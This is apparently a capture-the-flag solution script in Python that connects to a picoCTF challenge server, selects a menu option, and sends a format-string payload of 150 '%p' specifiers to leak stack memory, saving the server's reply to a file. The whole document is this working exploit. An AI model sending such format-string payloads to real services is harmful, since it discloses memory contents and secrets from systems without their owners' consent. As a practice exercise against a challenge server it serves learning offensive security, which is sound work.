import socket

global HOST
global PORT

def print_server(s, stopper):
    with open("data.bin", "w") as f:
        while True:
            data = s.recv(1024).decode()
            f.write(data)
            print(data)
            if stopper in data:
                f.close()
                return


def read_server(s, stopper):
    while True:
        data = s.recv(1024).decode()
        if stopper in data:
            return


if __name__ == "__main__":
    HOST = "mercury.picoctf.net"
    PORT = 33411
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.send("1\n".encode())
        read_server(s, "token")

        exploit = "%p" * 150

        s.send(exploit.encode())
        print_server(s, "Portfolio")
 
